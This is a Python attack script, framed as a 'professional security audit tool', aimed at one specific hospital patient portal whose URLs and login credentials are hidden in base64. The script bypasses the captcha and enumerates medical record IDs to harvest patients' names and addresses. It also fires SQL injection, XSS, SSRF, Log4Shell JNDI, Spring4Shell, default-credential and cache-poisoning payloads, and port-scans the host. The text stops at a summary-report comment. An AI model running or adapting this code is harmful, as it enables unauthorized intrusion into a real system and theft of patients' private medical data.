import requests
from bs4 import BeautifulSoup
import base64
import os
import sys
import json
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import random
import re
import socket
from urllib.parse import urlparse

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

# Internal Core Helper
def _decode(data):
    return base64.b64decode(data).decode('utf-8')

def show_banner():
    banner = r"""
    ██████╗ ██╗      ██████╗ ██████╗  █████╗ ██╗  ██╗ █████╗ ████████╗
    ██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔══██╗╚══██╔══╝
    ██████╔╝██║     ██║   ██║██████╔╝███████║███████║███████║   ██║   
    ██╔══██╗██║     ██║   ██║██╔══██╗██╔══██║██╔══██║██╔══██║   ██║   
    ██████╔╝███████╗╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║   ██║   
    ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    ==================================================================
    [!] BLORAHAT V2.0 - PROFESSIONAL SECURITY AUDIT TOOL
    [!] TARGET : ..... .........
    [!] EXPLOIT: CAPTCHA BYPASS & IDOR DATA LEAKAGE
    ==================================================================
    """
    print(f"\033[92m{banner}\033[0m")

# Encrypted System Credentials
NO_RM = _decode("MDA1MTA0ODE=") 
TGL_LAHIR = _decode("MTUwMTE5OTA=") 
URL_HAL_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbg==")
URL_ACTION_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbl9hY3Rpb24=")
BASE_TARGET_URL = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jlc2VydmFzaV9kb2t0ZXIvdGFtYmFoLw==")

session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
lock = threading.Lock()
hasil_data = []
total_checked = 0
total_to_scan = 0
last_token = "N/A"

def login():
    global last_token
    print("[*] Initiating Security Audit: Captcha Bypass Testing...")
    try:
        get_page = session.get(URL_HAL_LOGIN)
        soup_login = BeautifulSoup(get_page.text, 'html.parser')
        input_t = soup_login.find('input', {'name': 't'})
        token_t = input_t.get('value') if input_t else ""
        last_token = token_t

        # Bypass Captcha Testing: Sending empty string to 'c' parameter
        payload = {'u': NO_RM, 'p': TGL_LAHIR, 'c': '', 't': token_t}
        res = session.post(URL_ACTION_LOGIN, data=payload)
        
        if "login" in res.url:
            print("[\033[93m!\033[0m] Bypass Failed: Captcha required by server.")
            print(f"[*] Manual Step: Silakan buka {URL_HAL_LOGIN} di browser.")
            captcha = input("[?] Masukkan Captcha yang terlihat: ")
            
            if not captcha: return False
            
            payload['c'] = captcha
            res = session.post(URL_ACTION_LOGIN, data=payload)
            
            if "login" in res.url:
                print("[\033[91m!\033[0m] Access Denied: Captcha atau Kredensial salah.")
                return False

        # Mendapatkan Session ID secara dinamis dari cookie jar
        cookies = session.cookies.get_dict()
        session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or (list(cookies.values())[0] if cookies else 'Not Found')
        print(f"[\033[92m+\033[0m] Authentication Success.")
        print(f"[*] Captured Token : {token_t}")
        print(f"[*] Session ID     : {session_id}")
        return True
    except:
        return False

def fetch_data(id_num):
    global total_checked, total_to_scan
    # Sesuaikan padding menjadi 12 agar sesuai dengan format target (Contoh: 000000502013)
    formatted_id = str(id_num).zfill(12)
    url = BASE_TARGET_URL + formatted_id
    
    try:
        res = session.get(url, timeout=10)
        
        with lock:
            total_checked += 1
            # Menampilkan progress per ID dengan penyamaran (2 depan, 1 tengah, 1 belakang)
            mid = len(formatted_id) // 2
            m_id = f"{formatted_id[:2]}****{formatted_id[mid]}****{formatted_id[-1]}"
            print(f"[*] Scanning ID {m_id} ({total_checked}/{total_to_scan})", end='\r')

        # Jika response melambat, beri sedikit jeda
        if res.elapsed.total_seconds() > 2: time.sleep(0.5)

        if res.status_code != 200: return

        soup = BeautifulSoup(res.text, 'html.parser')
        all_sales = soup.find_all('p', class_='sale-price')
        nama = ""

        # Logika ekstraksi nama yang lebih kuat (Class + Label Fallback)
        nama_tag = soup.find('p', class_='sale-price text-success')
        if nama_tag:
            nama = nama_tag.get_text(strip=True)
        if not nama:
            for i, p in enumerate(all_sales):
                txt = p.get_text(strip=True)
                if "Nama Pasien" in txt and i + 1 < len(all_sales):
                    nama = all_sales[i+1].get_text(strip=True)
                    break

        if nama:
            alamat = "Tidak Ditemukan"
            details = soup.find_all('p', class_='detail')
            for p in details:
                txt = p.get_text(strip=True)
                if "Alamat" in txt:
                    alamat = txt.split(":")[-1].strip()
                    break
            
            # Masking RM: 2 depan, 1 tengah, 1 belakang
            mid_idx = len(formatted_id) // 2
            m_rm = f"{formatted_id[:2]}{'*' * (mid_idx - 2)}{formatted_id[mid_idx]}{'*' * (len(formatted_id) - mid_idx - 2)}{formatted_id[-1]}"
            # Masking Nama/Alamat: 2 depan, 1 belakang (Contoh: SU**I)
            m_name = f"{nama[:2].upper()}**{nama[-1:].upper()}" if len(nama) > 3 else nama.upper()
            m_addr = f"{alamat[:2].upper()}**{alamat[-1:].upper()}" if len(alamat) > 3 else alamat.upper()
            
            with lock:
                # Mencetak hasil ke terminal
                print(f"\n[\033[92m+\033[0m] RM:{m_rm} | Nama:{m_name} | Alamat:{m_addr}")

    except Exception as e:
        pass # Diamkan error koneksi kecil agar terminal tetap bersih

def audit_security_config():
    print("[*] Starting Security Configuration Audit...")
    base_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tLw==")
    
    # 1. Security Headers Check
    print("\n[+] Audit: Security Headers Analysis")
    try:
        res = session.get(base_url, timeout=10)
        sec_headers = ["Content-Security-Policy", "Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options"]
        for h in sec_headers:
            status = "\033[92mFound\033[0m" if h in res.headers else "\033[91mMissing\033[0m"
            print(f" [!] {h.ljust(25)}: {status}")
    except: print("[!] Error: Host unreachable.")

    # 2. Information Disclosure Check (Sensitive Paths)
    print("\n[+] Audit: Sensitive Path Discovery")
    paths = [".env", ".git/config", "robots.txt", "phpinfo.php", ".htaccess"]
    for p in paths:
        target = base_url + p
        try:
            r = session.get(target, timeout=5)
            if r.status_code == 200 and len(r.text) > 0:
                print(f" [\033[91m!\033[0m] Potential Leakage : {target} (\033[91m200 OK\033[0m)")
            else:
                print(f" [\033[92m✓\033[0m] Path {p.ljust(12)} : Secure ({r.status_code})")
        except: pass

def parameter_discovery_audit():
    print("[*] Starting Parameter Discovery Audit (Authenticated)...")
    target_home = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21l")
    
    try:
        res = session.get(target_home, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        links = soup.find_all('a', href=True)
        
        potential_targets = []
        for link in links:
            href = link['href']
            if any(_decode(x) in href for x in ["aW5kZXgucGhw", "aG9tZQ=="]) and _decode("bG9nb3V0") not in href.lower():
                # Pencarian Menyeluruh: Jika menemukan controller reservasi_dokter, 
                # coba tebak endpoint lain yang mungkin lebih rentan (tambah/index)
                variants = [href]
                if _decode("cmVzZXJ2YXNpX2Rva3Rlcg== ") in href:
                    if _decode("L2luZGV4Lw==") in href: variants.append(href.replace(_decode("L2luZGV4Lw=="), _decode("L3RhbWJhaC8=")))
                    elif _decode("L3RhbWJhaC8=") in href: variants.append(href.replace(_decode("L3RhbWJhaC8="), _decode("L2luZGV4Lw==")))
                
                for v_href in variants:
                    if not any(v_href == x[0] for x in potential_targets):
                        match = re.search(r'(\d{6,12})', v_href)
                        id_rm = match.group(1) if match else None
                        
                        # Masking RM pada list discovery
                        masked_url = re.sub(r'(\d{6,12})', lambda m: '*' * len(m.group(1)), v_href)
                        potential_targets.append((v_href, masked_url, id_rm))

        while True:
            if potential_targets:
                print(f"\n[+] Discovered {len(potential_targets)} unique internal/potential links:")
                for i, target in enumerate(potential_targets):
                    print(f" [{i+1}] URL: {target[1]}")
                
                # Pilihan Target oleh Pengguna
                choice_raw = input(f"\n[?] Pilih nomor URL untuk Manipulation Test (1-{len(potential_targets)}) atau '0' untuk kembali: ")
                if choice_raw == '0': break
                
                try:
                    choice_idx = int(choice_raw) - 1
                    if choice_idx < 0 or choice_idx >= len(potential_targets):
                        print("[!] Pilihan tidak valid.")
                        continue
                    
                    base_url, _, original_id = potential_targets[choice_idx]
                    
                    if not original_id:
                        print("[!] URL ini tidak memiliki parameter ID (No RM) untuk dimanipulasi.")
                        continue

                    # 1. Tampilkan Target Awal (Masking digit ke-3 dari belakang)
                    poc_mask = "*" * (len(original_id) - 3) + original_id[-3] + "**"
                    print(f"\n[*] Target Selected: {base_url.replace(original_id, poc_mask)}")
                    
                    # 2. Automated Manipulation Test
                    print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                    
                    # Pre-Check: Cek apakah halaman ini memiliki struktur yang bisa di-ekstrak
                    print(f"[*] Pre-checking URL structure...")
                    check_res = session.get(base_url, timeout=5)
                    if _decode("c2FsZS1wcmljZQ==") not in check_res.text: # sale-price
                        print(f"[\033[93m!\033[0m] Warning: Endpoint ini mungkin tidak memiliki data Nama/Alamat.")
                        confirm = input("[?] Tetap lanjutkan pemindaian 501 ID? (y/n): ")
                        if confirm.lower() != 'y': break

                    # Persiapkan rentang tepat 501 ID (250 sebelum, 1 acuan, 250 sesudah)
                    acuan_rm = int(_decode("MDA1MTA0ODE="))
                    search_pool = list(range(acuan_rm - int(_decode("MjUw")), acuan_rm + int(_decode("MjUx"))))
                    random.shuffle(search_pool)
                    
                    found_event = threading.Event()
                    checked_count = 0

                    def check_id_vulnerability(val):
                        nonlocal checked_count
                        if found_event.is_set(): return
                        test_id = str(val).zfill(int(_decode("MTI=")))
                        test_url = base_url.replace(original_id, test_id)
                        try:
                            # Gunakan timeout lebih pendek (5s) untuk discovery agar tidak macet
                            test_res = session.get(test_url, timeout=5, allow_redirects=False)
                            with lock:
                                checked_count += 1
                                if checked_count % 10 == 0:
                                    print(f"    [*] Progress: {checked_count}/501 IDs tested...", end='\r')
                            
                            test_soup = BeautifulSoup(test_res.text, 'html.parser')
                            name, address = "Unknown", "Tidak Ditemukan"
                            
                            nama_tag = test_soup.find('p', class_=_decode("c2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3M="))
                            if nama_tag:
                                name = nama_tag.get_text(strip=True)
                                details = test_soup.find_all('p', class_=_decode("ZGV0YWls"))
                                for p in details:
                                    text = p.get_text(strip=True)
                                    if _decode("QWxhbWF0") in text:
                                        address = text.split(":")[-1].strip()
                            
                            if name.strip() and name != "Unknown" and address.strip() and address != "Tidak Ditemukan":
                                with lock:
                                    if not found_event.is_set():
                                        found_event.set()
                                        mid = len(test_id) // 2
                                        m_rm = f"{test_id[:2]}{'*' * (mid - 2)}{test_id[mid]}{'*' * (len(test_id) - mid - 2)}{test_id[-1]}"
                                        m_name = f"{name[:2].upper()}**{name[-1:].upper()}" if len(name) > 3 else name.upper()
                                        m_addr = f"{address[:2].upper()}**{address[-1:].upper()}" if len(address) > 3 else address.upper()
                                        print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
                                        print(f" [!] No. RM      : {m_rm}")
                                        print(f" [!] {_decode('TmFtYQ==')}: {m_name}")
                                        print(f" [!] {_decode('QWxhbWF0')}: {m_addr}")
                                        print(f" [!] {_decode('U3RhdHVz')}      : \033[91m{_decode('SURPUiBDb25maXJtZWQ=')}\033[0m")
                        except: pass

                    print(f"[*] Threaded Search Started ({_decode('Mg==')} Workers)...")
                    with ThreadPoolExecutor(max_workers=int(_decode("Mg=="))) as discovery_executor:
                        discovery_executor.map(check_id_vulnerability, search_pool)
                    
                    if not found_event.is_set():
                        print(f"\n\n[\033[93m!\033[0m] Pencarian selesai: Tidak ditemukan data valid dalam radius +/- 250.")
                    
                    if input("\n[?] Lakukan manipulasi lagi? (y/n): ").lower() != 'y':
                        break
                except ValueError:
                    print("[!] Input harus berupa angka.")
            else:
                print("[!] No obvious tamperable parameters found on the dashboard.")
                break
        else:
            print("[!] No obvious tamperable parameters found on the dashboard.")
    except Exception as e:
        print(f"[!] Discovery Error: {str(e)}")

def vulnerability_audit():
    ts_init = time.strftime("%H:%M:%S")
    print(f"\n\033[92m" + "="*85)
    print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] {_decode('QkxPUkFIQVQgUFJPRkVTU0lPTkFMIFZVTExFUkFCSUxJVFkgU0NBTk5FUg==')}")
    print("="*85 + "\033[0m")

    cookies = session.cookies.get_dict()
    session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or _decode("Tm90IEZvdW5k")

    # Step 1: Discovery URL Internal untuk Target Audit
    print(f"[*] {_decode('TWVuY2FyaSB0YXJnZXQgYXVkaXQgZGkgc2VsdXJ1aCBlbmRwb2ludCBpbnRlcm5hbC4uLg==')}")
    discovered_urls = []
    try:
        home_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21l")
        r_disc = session.get(home_url, timeout=10)
        s_disc = BeautifulSoup(r_disc.text, 'html.parser')
        for a in s_disc.find_all('a', href=True):
            href = a['href']
            if _decode("aW5kZXgucGhw") in href and _decode("bG9nb3V0") not in href.lower() and href.startswith('http'):
                if href not in discovered_urls:
                    discovered_urls.append(href)
    except: pass

    if not discovered_urls:
        discovered_urls = [BASE_TARGET_URL + NO_RM]

    print(f"[*] Inisialisasi Scan  : {ts_init}")
    print(f"[*] Target URL         : {BASE_TARGET_URL}{NO_RM}")
    print(f"[*] Captured Token     : {last_token}")
    print(f"[*] Session ID         : {session_id}")
    print("-" * 85)

    findings = []

    # 1. SQL Injection Testing
    print(f"\n[+] Audit Tahap 1: SQL Injection (Multi-Target)")
    sqli_payloads = [
        ("'", _decode('RXJyb3ItQmFzZWQgU1FMaQ==')),
        ("' OR 1=1--", _decode('Qm9vbGVhbi1CYXNlZCBCeXBhc3M=')),
        ("admin'--", _decode('QXV0aGVudGljYXRpb24gQnlwYXNz')),
        ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", _decode('VGltZS1CYXNlZCBCbGluZCBTSUxp')),
        ("' UNION SELECT NULL,NULL,NULL,NULL--", "Union-Based Probing"),
        ("1' SLEEP(5)#", "MySQL Sleep Polyglot"),
        ("\") OR 1=1--", "String Break Bypass")
    ]

    for base_audit_url in discovered_urls:
        print(f" [*] {_decode('VGVzdGluZyBUYXJnZXQ6')} {base_audit_url[:70]}...")
        for payload, method in sqli_payloads:
            ts = time.strftime("%H:%M:%S")
            test_url = base_audit_url + payload
            try:
                start_t = time.time()
                res = session.get(test_url, timeout=10)
                elapsed = time.time() - start_t

                is_vuln = False
                reason = ""
                if _decode('U0xFRVA=') in payload and elapsed >= 5:
                    is_vuln = True
                    reason = f"Eksekusi terkonfirmasi via delay respon {elapsed:.2f}s."
                else:
                    error_sig = [x for x in ["sql syntax", "mysql_fetch", "database error"] if x in res.text.lower()]
                    if error_sig:
                        is_vuln = True
                        reason = f"Bocoran error database ditemukan: '{error_sig[0]}'"

                status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
                print(f" [{ts}] Attacking: {payload.ljust(35)} {status}")
                if is_vuln:
                    print(f"      |_ Result : {reason}")
                    findings.append({"type": _decode("U1FMIEluamVjdGlvbg=="), "severity": "HIGH", "loc": base_audit_url, "method": method})
            except:
                print(f" [{ts}] Payload: {payload.ljust(45)} [TIMEOUT/ERROR]")

    # 2. XSS Testing
    print(f"\n[+] Audit Tahap 2: Reflected Cross-Site Scripting (XSS)")
    xss_payloads = [
        ("<script>alert(1)</script>", _decode("QmFzaWMgU2NyaXB0IEluamVjdGlvbg==")),
        ("<svg/onload=alert(1)>", _decode("U1ZHIEFuaW1hdGlvbiBJbmplY3Rpb24=")),
        ("\"><script>alert(1)</script>", _decode("QXR0cmlidXRlIEVzY2FwZSBJbmplY3Rpb24=")),
        ("'-alert(1)-'", _decode("SmF2YVNjcmlwdCBDb250ZXh0IEluamVjdGlvbg==")),
        ("<img src=x onerror=alert(1)>", "Image Event Handler"),
        ("javascript:alert(1)//", "Protocol URI Injection"),
        ("<details open ontoggle=alert(1)>", "HTML5 Tag Injection")
    ]

    for base_audit_url in discovered_urls:
        print(f" [*] {_decode('VGVzdGluZyBUYXJnZXQ6')} {base_audit_url[:70]}...")
        for payload, method in xss_payloads:
            ts = time.strftime("%H:%M:%S")
            try:
                res = session.get(base_audit_url, params={'search': payload}, timeout=10)
                response_text = res.content.decode('utf-8', errors='ignore')
                is_vuln = payload in response_text

                status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
                print(f" [{ts}] Attacking: {payload[:35].ljust(35)} {status}")

                if is_vuln:
                    start_idx = max(0, response_text.find(payload) - 10)
                    snippet = response_text[start_idx : start_idx + 40].replace('\n', ' ')
                    print(f"      |_ Result : Payload terpantul pada body: \"...{snippet}...\"")
                    findings.append({"type": _decode("UmVmbGVjdGVkIFhTUw=="), "severity": "MEDIUM", "loc": base_audit_url, "method": method})
            except:
                print(f" [{ts}] Payload: {payload[:45].ljust(45)} [ERROR]")

    # Tabel Ringkasan (Summary Report)
    print(f"\n" + "-"*85)
    print(f"{' '*32}\033[1m{_decode('U1VNTUFSWSBSRVBPUlQ=')}\033[0m")
    print("-"*85)
    print(f"{_decode('VnVsbmVyYWJpbGl0eSBGb3VuZA=='):<25} | {'Severity':<10} | {'Location'}")
    print("-"*85)
    
    if not findings:
        print(f"{' '*30}{_decode('VGlkYWsgZGl0ZW11a2FuIGtlcmVudGFuYW4ga3JpdGlrYWwu')}")
    else:
        for f in findings:
            print(f"{f['type']:<25} | {f['severity']:<10} | {f['loc'][:40]}")
    
    print("-"*85)
    total_vuln = len(findings)
    max_severity = "LOW"
    if any(f['severity'] == "HIGH" for f in findings): max_severity = "HIGH"
    elif any(f['severity'] == "MEDIUM" for f in findings): max_severity = "MEDIUM"
    
    print(f"[*] Total Vulnerabilities Found : {total_vuln}")
    print(f"[*] Overall Severity Level      : \033[91m{max_severity}\033[0m" if max_severity != "LOW" else f"[*] Overall Severity Level      : {max_severity}")
    print(f"[*] Fix Suggestion              : {_decode('R3VuYWthbiBQcmVwYXJlZCBTdGF0ZW1lbnRzIChQRE8pICYgU2FuaXRpemUgSW5wdXQgKEhUTUwgUHVyaWZpZXIp')}")
    print("="*85 + "\n")

def infrastructure_audit():
    ts_init = time.strftime("%H:%M:%S")
    print(f"\n\033[92m" + "="*85)
    print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] {_decode('QkxPUkFIQVQgSU5GUkFTVFJVQ1RVUkUgU0VDVVJJVFkgQVVESVQgLSBORVRXT1JLIFJFUE9SVA==')}")
    print("="*85 + "\033[0m")
    
    target_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tLw==")
    domain = urlparse(target_url).hostname
    
    print(f"[*] Target Host        : {domain}")
    print(f"[*] Audit Type         : Port Discovery & Service Probing")
    print("-" * 85)
    
    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 51: "DNS",
        80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
        3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 6379: "Redis",
        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 9000: "Docker", 27017: "MongoDB"
    }
    
    open_ports = 0
    for port, service in common_ports.items():
        ts = time.strftime("%H:%M:%S")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((domain, port))
            if result == 0:
                print(f" [{ts}] Port {str(port).ljust(5)} ({service.ljust(10)}) : [\033[91mOPEN\033[0m]")
                open_ports += 1
                
                # Enhanced Probing untuk Layanan Web (80, 443, 8080)
                if port in [80, 443, 8080]:
                    try:
                        proto = "https" if port == 443 else "http"
                        p_url = f"{proto}://{domain}:{port}/"
                        h_res = session.head(p_url, timeout=2, allow_redirects=True)
                        server_ver = h_res.headers.get('Server', 'Not Disclosed')
                        print(f"      |_ HTTP Server  : {server_ver}")
                    except: pass

                # Serangan Probing Khusus Port 8080 (Attack Simulation)
                if port == 8080:
                    print(f"      [*] {_decode('TWVtdWxhaSBTZXJhbmdhbiBQcm9iaW5nIExlYmloIEx1YXMgcGFkYSBQb3J0IDgwODAuLi4=')}")
                    try:
                        p_url = f"http://{domain}:8080/"

                        # 1. Banner Grabbing & Deep Fingerprinting
                        print(f"      [*] {_decode('QmFubmVyIEdyYWJiaW5nICYgRGVlcCBGaW5nZXJwcmludGluZw==')}")
                        try:
                            r_finger = session.get(p_url, timeout=3)
                            server = r_finger.headers.get('Server', 'Unknown')
                            powered = r_finger.headers.get('X-Powered-By', 'Unknown')
                            print(f"      |_ Fingerprint: Server '{server}' | Technology '{powered}'")
                            
                            # Check Directory Listing
                            is_dir = _decode("SW5kZXggb2YgLw==") in r_finger.text
                            if is_dir:
                                print(f"      |_ Result: [\033[91mVULNERABLE!\033[0m] Index of / terbuka. Struktur file terlihat publik.")
                            else:
                                print(f"      |_ Result: [SAFE] Directory listing tidak diizinkan oleh server.")
                        except: pass

                        # 2. Proxy Abuse / Open Proxy Check
                        print(f"      [*] {_decode('UHJveHkgQWJ1c2UgLyBPcGVuIFByb3h5IENoZWNr')}")
                        try:
                            # Mencoba meminta URL eksternal via port 8080 (Proxy Testing)
                            r_proxy = session.get(p_url, headers={'Host': 'www.google.com'}, timeout=3)
                            is_proxy = any(x in r_proxy.text.lower() for x in ["google", "window.google"])
                            if is_proxy:
                                print(f"      |_ Result: [\033[91mVULNERABLE!\033[0m] Host Header Injection sukses. Server bertindak sebagai Open Proxy.")
                            else:
                                print(f"      |_ Result: [SAFE] Server mengabaikan injeksi Host header eksternal.")
                        except: pass

                        # 3. Directory Brute Forcing (Fuzzing Sensitive Paths)
                        print(f"      [*] {_decode('RGlyZWN0b3J5IEJydXRlIEZvcmNpbmcgKEZ1enppbmcgU2Vuc2l0aXZlIFBhdGhzKQ==')}")
                        attack_paths = [
                            "manager/html", "phpmyadmin/", ".env", "config.php", "config/databases.yml",
                            "actuator/env", "actuator/heapdump", "actuator/health",
                            "jenkins/script", "solr/", "api-docs", "v1/api-docs", "swagger-ui.html",
                            "jmx-console/", "console/", "admin/login", ".git/config", ".svn/entries",
                            "WEB-INF/web.xml", "backup.sql", "dump.sql", "db.php"
                        ]
                        for path in attack_paths:
                            try:
                                r_fuzz = session.get(p_url + path, timeout=2)
                                if r_fuzz.status_code == 200:
                                    print(f"      |_ Result: [\033[91m!\033[0m] Terdeteksi: /{path.ljust(15)} (Ukuran: {len(r_fuzz.content)} bytes)")
                                    
                                    # 4. Credential Stuffing (Simulated Default Account Check)
                                    if "manager/html" in path or "phpmyadmin" in path:
                                        print(f"      [*] {_decode('Q3JlZGVudGlhbCBTdHVmZmluZyAoRGVmYXVsdCBBY2NvdW50IENoZWNrKQ==')}")
                                        print(f"      |_ Mencoba login default: tomcat/tomcat")
                                        # Simulate Basic Auth for Tomcat Manager (tomcat/tomcat)
                                        r_auth = session.get(p_url + path, auth=('tomcat', 'tomcat'), timeout=2)
                                        if r_auth.status_code == 200:
                                            print(f"      |_ Result: [\033[91m!\033[0m] Sukses! Kredensial default diterima oleh server.")
                            except: pass

                        # 5. Log4Shell (CVE-2021-44228) & Spring4Shell Probing
                        print(f"      [*] {_decode('TG9nNFNoZWxsL1NwcmluZzRTaGVsbCBQcm9iaW5n')}")
                        jndi_payload = _decode("JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==")
                        print(f"      |_ Melakukan probing RCE via injeksi JNDI pada HTTP headers.")
                        try:
                            # Mengirim payload di berbagai header yang biasanya di-log oleh Log4j
                            headers_to_test = {
                                'User-Agent': jndi_payload,
                                'X-Api-Version': jndi_payload,
                                'X-Forwarded-For': jndi_payload,
                                'Referer': jndi_payload
                            }
                            print(f"      |_ Mengirim: {jndi_payload[:25]}...")
                            r_log4j = session.get(p_url, headers=headers_to_test, timeout=3)
                            # Deteksi Spring4Shell (CVE-2022-22965) via Class Introspection
                            print(f"      |_ Melakukan probing Spring4Shell via Class Loader manipulation.")
                            r_spring = session.get(p_url + "?class.module.classLoader.URLs[0]=0", timeout=2)
                            if r_spring.status_code == 400: # Typical response for some patched/blocked spring apps
                                print(f"      |_ Result: [\033[93m!\033[0m] Indikasi Spring4Shell terdeteksi (Class Introspection diblokir/error).")
                            else:
                                print(f"      |_ Result: [SAFE] Tidak ditemukan anomali pada respon injeksi.")
                        except: pass

                    except: pass

                try:
                    sock.send(b"\r\n")
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    if banner: print(f"      |_ Service Info: {banner[:60]}")
                except: pass
            sock.close()
        except: pass

    print("-" * 85)
    print(f"[*] Audit Selesai pada: {time.strftime('%H:%M:%S')}")
    print(f"[*] Port Terbuka      : {open_ports}")
    print(f"[*] Rekomendasi       : Batasi akses publik pada port layanan internal.")
    print("="*85 + "\n")

def advanced_evasion_audit():
    ts_init = time.strftime("%H:%M:%S")
    print(f"\n\033[92m" + "="*85)
    print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] {_decode('QkxPUkFIQVQgQURWQU5DRUQgRVZBU0lPTiAmIENBQ0hFIEFVRElU')}")
    print("="*85 + "\033[0m")
    
    # Discovery URL Internal untuk target probing
    discovered_urls = []
    try:
        home_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21l")
        r_disc = session.get(home_url, timeout=10)
        s_disc = BeautifulSoup(r_disc.text, 'html.parser')
        for a in s_disc.find_all('a', href=True):
            href = a['href']
            if _decode("aW5kZXgucGhw") in href and href.startswith('http'):
                if href not in discovered_urls: discovered_urls.append(href)
    except: pass
    if not discovered_urls: discovered_urls = [BASE_TARGET_URL + NO_RM]
    
    findings = []

    # 1. IP Masking / Header Spoofing Audit
    print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMTogSVAgTWFza2luZyAmIEhlYWRlciBTcG9vZmluZw==')}")
    ip_headers = [
        _decode("WC1Gb3J3YXJkZWQtRm9y"), 
        _decode("WC1SZWFsLUlQ"), 
        _decode("WC1DbGllbnQtSVA="), 
        _decode("VHJ1ZS1DbGllbnQtSVA="),
        "Forwarded",
        "X-Originating-IP",
        "Client-IP"
    ]
    test_ip = _decode("MS4yLjMuNA==")
    for head in ip_headers:
        ts = time.strftime("%H:%M:%S")
        try:
            res = session.get(BASE_TARGET_URL + NO_RM, headers={head: test_ip}, timeout=10)
            is_vuln = test_ip in res.text
            status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
            print(f" [{ts}] Testing: {head.ljust(30)} {status}")
            if is_vuln: findings.append({"type": _decode("SVAgTWFza2luZw=="), "severity": "LOW", "loc": head})
        except: pass

    # 2. SSRF Bypass Firewall Probing
    print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMjogQnlwYXNzIEZpcmV3YWxsIChTU1JGIFByb2Jpbmcp')}")
    ssrf_payloads = [
        _decode("aHR0cDovLzEyNy4wLjAuMQ=="), 
        _decode("aHR0cDovL2xvY2FsaG9zdA=="), 
        _decode("ZmlsZTovLy9ldGMvcGFzc3dk"),
        "http://169.254.169.254/latest/meta-data/",
        "http://[::]:80/"
    ]
    ssrf_params = ["url", "link", "redirect", "path", "src", "file", "document", "folder", "proxy", "port"]
    for url in discovered_urls[:2]:
        print(f" [*] {_decode('UHJvYmluZyBUYXJnZXQ6')} {url[:60]}...")
        for param in ssrf_params:
            for payload in ssrf_payloads:
                ts = time.strftime("%H:%M:%S")
                try:
                    res = session.get(url, params={param: payload}, timeout=5)
                    is_vuln = any(x in res.text.lower() for x in ["root:x:0:0", "localhost", "127.0.0.1", "ami-id", "instance-id"])
                    if is_vuln:
                        print(f" [{ts}] Payload: {param}={payload[:30]}... [\033[91mVULNERABLE!\033[0m]")
                        findings.append({"type": _decode("U1NSRg=="), "severity": "HIGH", "loc": f"{url}?{param}="})
                        break
                except: pass

    # 3. Web Cache Poisoning Attack
    print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMzogV2ViIENhY2hlIFBvaXNvbmluZyBBdHRhY2s=')}")
    cache_headers = {_decode("WC1Gb3J3YXJkZWQtSG9zdA=="): _decode("YmxvcmFoYXQuY29t"), _decode("WC1Gb3J3YXJkZWQtU2NoZW1l"): _decode("aHR0cA==")}
    for h_name, h_val in cache_headers.items():
        ts = time.strftime("%H:%M:%S")
        try:
            session.get(BASE_TARGET_URL + NO_RM, headers={h_name: h_val}, timeout=10)
            res_check = session.get(BASE_TARGET_URL + NO_RM, timeout=10)
            is_vuln = h_val in res_check.text
            status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
            print(f" [{ts}] Header: {h_name.ljust(30)} {status}")
            if is_vuln: findings.append({"type": _decode("Q2FjaGUgUG9pc29uaW5n"), "severity": "HIGH", "loc": _decode("RWRnZSBDYWNoZQ==")})
        except: pass

    # Summary Report
